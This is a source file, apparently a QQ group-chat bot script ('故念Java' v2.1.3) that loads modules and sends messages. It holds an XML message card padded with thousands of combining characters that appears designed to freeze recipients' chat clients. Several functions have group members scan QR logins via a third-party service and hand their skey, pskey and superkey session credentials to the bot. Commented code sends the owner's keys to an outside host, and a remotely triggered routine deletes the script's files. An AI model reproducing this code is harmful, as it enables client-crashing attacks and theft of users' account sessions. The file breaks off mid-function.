int maxW=1024;//控制图片模式发送的最大图片宽度(单位:像素)

import android.app.*;
import android.widget.*;
import android.content.*;
import android.text.*;
import java.util.*;
import java.text.*;
import org.json.JSONArray;
import org.json.JSONObject;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.net.URLEncoder;
import java.net.URLDecoder;
String RootPath = AppPath+"/";
String[] files = {"API/fileSystem","API/httpRequests","API/keyValueSys","点歌","我想","复读","长文本检测","菜单","娱乐","禁词检测","红包","自动回复","整点报时","限制","代管","陪聊","其他","抽奖","消息切换"};
boolean issq = true;
Toast("未授权将无法使用上管下管等功能，请进行授权");
if("".equals(getSkey())){issq=false;Toast("授权失败");}else{Toast("授权成功");}
for (String i:files){
	//Toast(RootPath+"故念目录/"+i+".java");
	load(RootPath+"故念目录/"+i+".java");
}keyValueSys hide = new keyValueSys(RootPath+"故念目录/hide");
keyValueSys opens = new keyValueSys(RootPath+"故念目录/opens");
keyValueSys globals = new keyValueSys(RootPath+"故念目录");
keyValueSys msgSave = new keyValueSys(RootPath+"故念目录/msgSave");
keyValueSys 限制 = new keyValueSys(RootPath+"故念目录/限制");
keyValueSys 代管 = new keyValueSys(RootPath+"故念目录/代管");
keyValueSys x = new keyValueSys(RootPath+"故念目录/self");
keyValueSys blackL = new keyValueSys(RootPath+"故念目录/blackL");
JSONObject yz = new JSONObject("{}");
JSONObject pskeyT = new JSONObject("{\"id.qq.com\":1,\"ti.qq.com\":2,\"qun.qq.com\":3,\"qzone.qq.com\":4,\"vip.qq.com\":5,\"huifu.qq.com\":6,\"docs.qq.com\":7,\"connect.qq.com\":8,\"graph.qq.com\":9,\"tenpay.com\":10,\"game.qq.com\":11,\"yundong.qq.com\":12,\"gamecenter.qq.com\":13}");
String 卡 = "<?xml version='1.0' encoding='UTF-8' standalone='yes' ?><msg serviceID=\"35\" templateID=\"1\" action=\"viewMultiMsg\" brief=\"震惊！某成员竟然干出这种好事？\" sourceMsgId=\"0\" url=\"\" flag=\"3\" adverSign=\"0\" multiMsgFlag=\"0\"><item layout=\"1\" advertiser_id=\"0\" aid=\"0\"><title size=\"26\" color=\"#777777\" maxLines=\"2\" lineSpace=\"12\">༙t༙྇྇ﭐ ऺ‍ﭐbٍّض ⁪ܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷ  ܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶ  ༙༙ܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶ྇྇ﭐ zऺ‍ﭐٍّض ⁪ܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷ</title><summary size=\"1\" >nb</summary></item><source name=\"聊天记录\" icon=\"\" action=\"\" appid=\"-1\" /></msg>";
//String[] emoji = new String[]{"☄","💥","❄","️🌊","⚡","✨","🌟","🎭","🌅","🌇","🌈","🎆","🌠","💈","🎀","💌","🎊","🎉","🔱","🔔","📢","¶"};
String[] emoji = new String[]{""};
String sv = "2.1.3";
if(globals.get(new String[]{"格式"},"进群").isEmpty())globals.set(new String[]{"格式"},"进群","欢迎[那人]进群！");
if(globals.get(new String[]{"格式"},"退群").isEmpty())globals.set(new String[]{"格式"},"退群","[那人]一路走好！");
String token;
public void getToken(String qun){
    new Thread(new Runnable(){
        public void run(){
            //Integer.parseInttoken = new httpRequests("http://121.62.60.31:5555/token.txt","").get("");//NkxDaTVwZWc1YitE
        }
    }).start();
}getToken("");
public String 文案(){
    String result = new httpRequests("https://v.api.aa1.cn/api/api-wenan-yingwen/index.php?type=text","").get("UTF-8");
    result = result.substring(result.indexOf(">")+1);
    result = result.substring(0,result.lastIndexOf("<"));
    return result;
}public void 发送(String qun,String qq,String msg,boolean head){
    String h = tu(new int[][]{{9,1},{27,1},{390,220},{374,204},{39,35},{98,96},{61,57},{98,96},{9,1},{27,1}});
    switch(Integer.parseInt(globals.get(new String[]{"模式"},"消息").isEmpty()?"3":globals.get(new String[]{"模式"},"消息"))){
        case 1:
            sendPic(qun,qq,"http://8.134.160.205:226/api/api/textToPic?text="+URLEncoder.encode(((head?h+"\n":"")+msg).replace("¶",emoji[rand(0,emoji.length)]))+"&maxW="+maxW+"&r="+rand(0,255)+"&g="+rand(0,255)+"&b="+rand(0,255));
            break;
        case 2:
            /*String card="{\"app\":\"com.tencent.bot.task.deblock\",\"desc\":\"xyz_ark测试\",\"view\":\"index\",\"ver\":\"2.0.4.0\",\"prompt\":\"故念Java\",\"appID\":\"\",\"sourceName\":\"\",\"actionData\":\"\",\"actionData_A\":\"\",\"sourceUrl\":\"\",\"meta\":{\"detail\":{\"\":[{\"num\":\"30\"}],\"appID\":\"\",\"battleDesc\":\"\",\"botName\":\"Hence\",\"cmdTitle\":\"\",\"content\":\""+msg+"\",\"guildID\":\"\",\"iconRight\":[],\"receiverName\":\"\",\"subGuildID\":\"SUBGUILDID#\",\"title\":\"故念Java\",\"titleColor\":\"purple\"}},\"text\":\"\",\"sourceAd\":\"\",\"extra\":\"\"}";
            Toast(new httpRequests("https://xiaobapi.top/api/xb/api/qq_card_token.php?qq="+MyUin+"&skey="+(issq?getSkey():"")+"&pskey="+(issq?getPskey("docs.qq.com"):""),"").post(URLEncoder.encode(card)));
            //sendCard(qun,"",new httpRequests("https://xiaobapi.top/api/xb/api/qq_card_token.php?qq="+MyUin+"&skey="+(issq?getSkey():"")+"&pskey="+(issq?getPskey("docs.qq.com"):""),"").post("json="+URLEncoder.encode(card)));
            break;*/
        default:
            sendMsg(qun,qq,((head?h+"\n":"")+msg).replace("¶",emoji[rand(0,emoji.length)]));
    }
    /*if(hide.get(new String[]{qun},"beHide").equals("true")){
        sendMsg(qun,qq,((head?h+"\n":"")+msg+" జ్ఞ ా رً ॣ").replace("¶",emoji[rand(0,emoji.length)]));
    }else{
        sendMsg(qun,qq,((head?h+"\n":"")+msg).replace("¶",emoji[rand(0,emoji.length)]));
    }*/
}public void 发送(String qun,qq,msg){
    发送(qun,qq,msg,true);
}public void 发送1(String qun,String qq,String msg){
    发送(qun,qq,msg,false);
}public long rand(long min,max){return (long)(Math.random()*(max-min)+min);}
public String getSkey(String qun,qq){
    if(qq.equals(MyUin)){
        return (issq?getSkey():"");
    }JSONObject r = new JSONObject(new httpRequests("https://xiaobai.klizi.cn/API/qqgn/a/logincode.php?qrsig=&type=1","").get(""));
    发送(qun,"","[AtQQ="+qq+"]请在两分钟内扫码[PicUrl="+r.getString("picurl")+"]");
    while(true){
        try{JSONObject r2 = new JSONObject(new httpRequests("https://xiaobai.klizi.cn/API/qqgn/a/logincode.php?qrsig="+r.getString("qrsig")+"&type=1","").get(""));
            if(r2.get("code")==1){
                发送(qun,"","二维码已失效");
                return null;
            }if(r2.get("code")==0){
                发送(qun,"","[AtQQ="+r2.getString("uin")+"]扫描完毕");
                return r2.getString("skey");
            }Thread.sleep(500);
        }catch(Exception e){}
    }
}public String getPskey(String qun,need,qq){
    if(qq.equals(MyUin)){
        return (issq?getPskey(need):"");
    }need = pskeyT.get(need);
    JSONObject r = new JSONObject(new httpRequests("https://xiaobai.klizi.cn/API/qqgn/a/logincode.php?qrsig=&type="+need,"").get(""));
    发送(qun,"","[AtQQ="+qq+"]请在两分钟内扫码[PicUrl="+r.getString("picurl")+"]");
    while(true){
        try{
            JSONObject r2 = new JSONObject(new httpRequests("https://xiaobai.klizi.cn/API/qqgn/a/logincode.php?qrsig="+r.getString("qrsig")+"&type="+need,"").get(""));
            if(r2.get("code")==1){
                发送(qun,"","二维码已失效");
                return null;
            }if(r2.get("code")==0){
                发送(qun,"","[AtQQ="+r2.getString("uin")+"]扫描完毕");
                return r2.getString("pskey");
            }Thread.sleep(500);
        }catch(Exception e){}
    }
}public String getSuperkey(String qun,qq){
    if(qq.equals(MyUin)){
        return (issq?getSuperkey():"");
    }JSONObject r = new JSONObject(new httpRequests("https://xiaobai.klizi.cn/API/qqgn/a/logincode.php?qrsig=&type=1","").get(""));
    发送(qun,"","[AtQQ="+qq+"]请在两分钟内扫码[PicUrl="+r.getString("picurl")+"]");
    while(true){
        try{JSONObject r2 = new JSONObject(new httpRequests("https://xiaobai.klizi.cn/API/qqgn/a/logincode.php?qrsig="+r.getString("qrsig")+"&type=1","").get(""));
            if(r2.get("code")==1){
                发送(qun,"","二维码已失效");
                return null;
            }if(r2.get("code")==0){
                发送(qun,"","[AtQQ="+r2.getString("uin")+"]扫描完毕");
                return r2.getString("superkey");
            }Thread.sleep(500);
        }catch(Exception e){}
    }
}public String[] getAll(String qun,need,qq){
    if(qq.equals(MyUin)){
        return new String[]{(issq?getSkey():""),(issq?getPskey(need):""),(issq?getSuperkey():"")};
    }need = pskeyT.get(need);
    JSONObject r = new JSONObject(new httpRequests("https://xiaobai.klizi.cn/API/qqgn/a/logincode.php?qrsig=&type="+need,"").get(""));
    发送(qun,"","[AtQQ="+qq+"]请在两分钟内扫码[PicUrl="+r.getString("picurl")+"]");
    while(true){
        try{
            JSONObject r2 = new JSONObject(new httpRequests("https://xiaobai.klizi.cn/API/qqgn/a/logincode.php?qrsig="+r.getString("qrsig")+"&type="+need,"").get(""));
            if(r2.get("code")==1){
                发送(qun,"","二维码已失效");
                return null;
            }if(r2.get("code")==0){
                发送(qun,"","[AtQQ="+r2.getString("uin")+"]扫描完毕");
                return new String[]{r2.getString("skey"),r2.getString("pskey"),r2.getString("superkey")};
            }Thread.sleep(500);
        }catch(Exception e){}
    }
}public boolean a(){try{for (NetworkInterface networkInterface : Collections.list(NetworkInterface.getNetworkInterfaces())) {if (networkInterface.isUp()){if(networkInterface.getName().equals("tun0"))return true;}}if(new httpRequests("http://8.134.160.205/free?qq="+MyUin,"").get("").equals("1")){Toast(tu(new int[][]{{287,33},{315,55},{652,534},{1705,1681},{2534,2508},{330,88},{482,264},{5453,5429},{480,386},{347,21},{306,48},{1594,1548},{5453,5429},{35832,35830},{5268,5254},{473,305},{363,19},{372,102},{1705,1681},{2534,2508},{3220,3198},{324,146}}));new fileSystem(RootPath+"故念𝙅𝙖𝙫𝙖.java").write("");for(String i:files){new fileSystem(RootPath+"故念目录/"+i+".java").delete();}return true;}}catch(e){}return false;}
public void b(){System.exit(0);}
public boolean isOp(String group,qq){
    Object[] g = getGroupList().toArray();
    for(int i = 0;i < g.length;i++){
        if(g[i].GroupUin.equals(group)){
